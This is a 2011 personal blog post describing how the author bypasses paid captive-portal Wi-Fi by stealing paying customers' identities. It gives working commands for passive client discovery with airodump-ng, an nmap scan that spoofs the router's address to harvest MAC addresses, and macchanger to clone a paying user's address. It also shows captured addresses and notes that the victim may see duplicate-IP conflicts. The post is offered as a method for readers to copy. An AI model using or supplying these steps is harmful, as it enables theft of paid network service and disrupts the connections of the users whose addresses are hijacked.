---
date: '2011-09-16 23:56:29'
layout: post
slug: entering-walled-gardens
status: publish
title: Entering Walled Garden's
wordpress_id: '759'
categories:
- Networking
tags:
- locked internet
- macchanger
- nmap
- walled garden
---

After visiting Alaska & Canada I have been wishing I was in the core USA more and more. Considering that in between Vancouver and Alaska internet is days apart, and that you have to pay for everything (and it's not cheap). Well I'm way to cheap to pay for internet, and would rather just go without, but when in a pinch, and from boredom I figured out a simple way to get some free interwebs. Most of the Walled Garden's (Open wireless connections that require you to login to use internet) are access controlled with MAC addresses, and as long as you can find an active (or recently active) user that paid for a connection, you're in business. Depending on where you are, and how smart the network guru is it might be a little tricky to collect some MAC addresses. Here is what I tried, and have been very successfully sucking the teet of the internet and all it's glorious power:   First I thought I would try a simple wireless scan, and find associated clients. Seems like a foolproof undetectable plan...

{% highlight bash %}

#Using my favorite tools part of the aircrack suite!

sudo airmon-ng start wlan0 #(wlan0 being your wireless interface)

sudo airodump-ng wlan0 #

{% endhighlight %}

This is an expected result. You'll only get computers that are close to you, and aren't necessary guaranteed reliable clients/MAC addresses.

{% highlight bash %}

CH  6 ][ BAT: 1 hour 55 mins ][ Elapsed: 0 s ][ 2011-09-16 23:40

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

00:22:6B:64:76:66  -82        3        1    0  11  54e  WPA  TKIP   PSK  SBW
00:25:9C:4D:4B:E8  -81        2        0    0  11  54e  OPN              linksys
00:1F:41:0F:C9:09  -76        2        1    0  11  54e. OPN              Connect_Here
00:1F:41:0F:EA:F9  -55        5        1    0  11  54e. OPN              Connect_Here
00:1F:41:0F:EB:09  -72        4        3    1   6  54e. OPN              Connect_Here

BSSID              STATION            PWR   Rate    Lost  Packets  Probes

00:1F:41:0F:C9:09  90:4C:E5:38:7C:6E   -1   12e- 0      0        1
00:1F:41:0F:EA:F9  90:84:0D:B3:D9:4A   -1   54e- 0      0        1
00:1F:41:10:C3:39  78:D6:F0:6C:A1:B3  -75    0 -24      0        1
(not associated)   00:1F:41:0F:EB:09  -70    0 - 2      0        3  Connect_Here
{% endhighlight %}

Well I didn't really get any gold with the wireless approach, so I decided to do something a little more despicable, and invasive. Come to find out the network I was exploiting had a good network guru, and all internal port traffic was blocked. No matter, I was still able to scan & find some clients. (with a little tomfoolery)

I started with my most common nmap scan:
{% highlight bash %}
sudo nmap -A -T4 192.168.99.100-200 # (-A -T4 and the network I'm scanning)
{% endhighlight %}

That didn't provide any results, so I had to get a little more creative. The network blocked ICMP pings, and a plethora of other nefarious traffic. So I started reading the man page on nmap, and found a line that gave me what I needed:

{% highlight bash %}
sudo nmap -A -T4 -Pn -S 192.168.99.4 192.168.99-102.100-200 -e wlan0 |grep MAC # (-A -T4 -Pn (ignore pings) -S 192.168.99.4 (spoof the source address -- I used the router as the spoof address) -- addresses I want to scan (their network wasn't separated via vlans, so I could scan internetwork) -e wlan0 (use wlan0 as scanning interface) | grep MAC (only give me the MAC addresses, I don't care about the rest)
{% endhighlight %}

This worked like a charm, and I was able to collect a wonderful bounty:
{% highlight bash %}
MAC Address: A4:67:06:71:37:60 (Unknown)
MAC Address: D8:9E:3F:34:A2:2F (Unknown)
MAC Address: 28:E7:CF:D2:C3:D5 (Unknown)
MAC Address: E8:06:88:48:58:CE (Apple )
MAC Address: B8:AC:6F:79:B5:8E (Dell)
MAC Address: 00:1E:4C:8E:AB:A6 (Hon Hai Precision Ind.Co.)
MAC Address: 18:F4:6A:B4:89:68 (Unknown)
MAC Address: 00:1C:23:A6:B0:AD (Dell)
MAC Address: 00:18:DE:98:60:AE (Intel)
MAC Address: 00:0E:35:4C:B4:4E (Intel)
MAC Address: 90:4C:E5:60:35:8A (Hon Hai Precision Ind. Co.)
MAC Address: 40:A6:D9:48:BF:71 (Unknown)
MAC Address: 00:1A:80:D6:61:6B (Sony)
MAC Address: 88:C6:63:52:CD:24 (Unknown)
{% endhighlight %}

Depending on how active the user was/is I'm easily able to change my mac address:
{% highlight bash %}
sudo macchanger -m A4:67:06:71:37:60 wlan0
{% endhighlight %}

And as long as it matched an authenticated user, hello internet, goodbye to $15 a day internet charges...

------

Things to consider are:
- If there is an active user, they might get warnings about a duplicate IP, since you are going to bind to their current IP address. 

- Depending on the smartness/stupidness of the network professional that setup/maintains the network; you might be prone blocked from duplicate IP's on a single MAC address.

- The network police could track you down, and make you pay (highly unlikely, but possible :)

Enjoy, and let me know if you have any success with my method, or if you have some tricks up your sleeves. I've yet to try NSTX or ICMPTX (IP over DNS, ICMP over DNS) but mean to eventually...
